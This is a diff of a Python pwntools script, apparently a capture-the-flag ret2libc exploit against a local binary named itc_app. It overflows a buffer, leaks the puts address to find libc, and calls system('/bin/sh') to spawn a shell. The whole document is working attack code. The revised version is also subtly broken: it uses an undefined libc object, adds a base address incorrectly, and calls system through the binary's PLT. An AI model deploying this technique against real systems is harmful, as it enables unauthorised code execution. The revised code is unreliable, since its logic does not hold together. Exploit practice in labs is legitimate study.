@@ -1,54 +1,50 @@
 from pwn import *
 
-# Set up the binary and libc objects
-elf = context.binary = ELF('./itc_app')
-libc = elf.libc
+# Set up the binary and context
+binary_path = './itc_app'
+elf = context.binary = ELF(binary_path)
+context.update(arch='i386', os='linux')
 
 # Start the process
-p = process()
+p = process(binary_path)
 
-# Initial output handling
-try:
-    initial_output = p.recvuntil('>', timeout=5)
-    print("Initial output:", initial_output.decode())
-except EOFError:
-    print("Did not receive initial prompt. Exiting.")
-    p.close()
-    exit()
+# Function to leak libc address and calculate libc base
+def leak_libc_address():
+    # Craft the first payload to leak the address of a libc function (puts)
+    payload = flat({
+        132: [
+            elf.plt['puts'],  # Call puts@plt to print out the address of puts@got
+            elf.symbols['main'],  # Return to main after leaking the address
+            elf.got['puts']  # Address of puts in the GOT to leak
+        ]
+    })
 
-# Build the first payload to leak the address of puts from GOT
-payload = flat(
-    b'A' * 132,
-    elf.plt['puts'],  # puts@plt
-    elf.sym['main'],  # Return to main for a second round
-    elf.got['puts']   # puts@got to leak its address
-)
+    # Send the payload
+    p.sendlineafter('>', payload)
 
-# Send the first payload
-p.sendline(payload)
+    # Receive the leaked address
+    leaked_puts = u32(p.recv(4))
+    log.info(f'Leaked puts@GOT address: {hex(leaked_puts)}')
 
-# Receive the leaked address
-puts_leak = u32(p.recv(4))
-p.recvline()  # Consume any extra output to clear the buffer
+    # Calculate the libc base address
+    libc_base = leaked_puts - libc.symbols['puts']
+    log.info(f'Calculated libc base address: {hex(libc_base)}')
+    return libc_base
 
-# Calculate libc base
-libc.address = puts_leak - libc.sym['puts']
-log.success(f'LIBC base: {hex(libc.address)}')
+# Calculate libc base address by leaking an address
+libc_base = leak_libc_address()
 
-# Building the second payload for invoking system("/bin/sh")
-payload = flat(
-    b'A' * 132,
-    libc.sym['system'],  # system() address in libc
-    0xdeadbeef,  # Fake return address after system()
-    next(libc.search(b'/bin/sh\x00'))  # Pointer to "/bin/sh" string in libc
-)
+# Craft the second payload to get a shell
+payload = flat({
+    132: [
+        elf.plt['system'],  # system@plt
+        next(elf.search(b'/bin/sh\x00')),  # Return to this address after system
+        libc_base + next(libc.search(b'/bin/sh\x00'))  # "/bin/sh" string found in libc
+    ]
+})
 
-# Send the second payload
-p.sendline(payload)
+# Send the payload to get a shell
+p.sendlineafter('>', payload)
 
-# Go interactive
-try:
-    p.interactive()
-except EOFError:
-    print("Got EOF while trying to go interactive. The process might have exited.")
-    p.close()
+# Switch to interactive mode
+p.interactive()
